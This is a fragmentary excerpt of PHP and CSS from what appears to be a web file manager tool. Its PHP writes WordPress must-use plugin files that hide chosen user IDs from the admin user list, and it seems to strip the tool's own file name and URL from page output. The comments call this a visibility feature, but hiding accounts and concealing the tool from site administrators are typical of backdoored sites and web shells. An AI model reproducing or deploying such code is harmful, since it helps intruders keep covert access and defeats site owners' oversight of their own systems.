...
'$b=str_replace([$f,$e,$u,rawurlencode($f),addslashes($f)],\'\',$b);}return $b;});}';
    ...
    private function cmsSyncHiddenVisibility($configPath,$c,$link=null){
        ...
        if($c['type']==='wordpress'){
            ...
            if(is_dir($muDir)){
                foreach((array)@glob($muDir.'/hide_user_*.php') as $legacyFile){
                    $legacyName=basename($legacyFile);
                    if(!preg_match('/^hide_user_(\d+)\.php$/',$legacyName,$legacyMatch))continue;
                    $legacyId=(int)$legacyMatch[1];
                    $legacySrc=(string)@file_get_contents($legacyFile);
                    if(strpos($legacySrc,'pre_get_users')===false||strpos($legacySrc,'hidden_id')===false)continue;
                    ...
                    if(!@unlink($legacyFile)){
                        // Keep the user's hidden state without allowing this
                        // old file to affect authentication or front-end code.
                        $safeLegacy="<?php\n"
                            ."/* Migrated by Marshal File Manager; retained only because the original file could not be deleted. */\n"
                            ."if(is_admin()){add_action('pre_get_users',function(\$query){\$query->set('exclude',array_values(array_unique(array_merge((array)\$query->get('exclude'),[".$legacyId."]))));});}\n";
                        @file_put_contents($legacyFile,$safeLegacy);
                    }
                }
            }
 ...
 */
                 ...
                 * administrator area. wp-login.php authenticates by looking
                 * up the user directly, but the guard also prevents this
                 * visibility feature from ever changing a front-end/login
                 * user query in a plugin or custom theme.
                 */
                if (!is_admin()) return;
    ...
    $query->set('exclude', array_values(array_unique(array_merge(
...
.toolbar .tb-row .btn-sm,.toolbar .tb-row .upl-lbl{height:32px;justify-content:center;padding-top:0;padding-bottom:0}
...
@media(max-width:768px){
  ...
  .topbar{padding:0 max(10px,env(safe-area-inset-left)) 0 max(10px,env(safe-area-inset-right));gap:5px;min-height:var(--th)}
  ...
  .tb-right{gap:4px;min-width:0}
  .tb-right .btn,.tb-right .btn-sm,.tb-right .btn-icon{height:40px;min-height:40px}
  .tb-right .btn-icon{min-width:40px}
...
@media(max-width:430px){
  ...
  .menu-btn{min-width:38px!important;width:38px}
  .brand-icon,.brand-icon img{width:29px;height:29px}
  .tb-right{gap:2px}
  .tb-right .btn,.tb-right .btn-sm,.tb-right .btn-icon{height:38px;min-height:38px}
  .tb-right .btn-icon{min-width:38px}
